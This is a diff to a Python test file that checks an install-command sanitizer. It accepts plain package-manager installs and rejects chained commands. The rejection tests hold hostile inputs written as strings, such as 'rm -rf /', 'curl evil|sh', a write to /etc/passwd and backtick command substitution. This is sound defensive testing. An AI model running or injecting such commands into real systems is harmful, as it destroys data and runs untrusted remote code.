@@ -70,12 +70,23 @@ def test_sanitize_install_accepts_simple_package_installs():
     assert sanitize_install("pip install httpx") == "pip install httpx"
 
 
+def test_sanitize_install_accepts_extended_managers():
+    for cmd in (
+        "pipx install semgrep",
+        "go install github.com/x/y@latest",
+        "cargo install rustscan",
+        "npm install -g wappalyzer",
+    ):
+        assert sanitize_install(cmd) == cmd
+
+
 def test_sanitize_install_rejects_shell_metacharacters():
     assert sanitize_install("apt-get install -y nmap; rm -rf /") == ""
     assert sanitize_install("pip install x && curl evil|sh") == ""
     assert sanitize_install("echo pwned > /etc/passwd") == ""
     assert sanitize_install("$(curl evil)") == ""
     assert sanitize_install("git clone http://evil/x") == ""  # not an allowed manager
+    assert sanitize_install("go install foo`whoami`") == ""
 
 
 def test_valid_binary_requires_bare_token():
